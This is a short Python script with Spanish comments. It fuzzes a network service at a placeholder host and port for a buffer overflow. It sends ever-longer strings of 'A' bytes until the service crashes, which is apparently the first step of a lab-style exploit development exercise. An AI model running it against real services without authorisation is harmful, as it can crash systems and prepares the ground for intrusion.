#!/usr/bin/python3
import socket

# Conexion al objetivo 
rhost = "target"
rport = 1234

# Datos a enviar:
payload = b"A" * 100

print("Verificar caida de overflow")
try:
    while True:
        print("bytes ==> " + str(len(payload)))
        # Creacion del socket object TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Conexion al servicio
        s.connect((rhost, rport))
        # Envio del payload
        s.send(payload + b"\n")
        # Recepcion de los datos enviados por el server
        data = s.recv(1024)
        payload += b"A" * 100
except Exception as err:
    print("Error: " + str(err))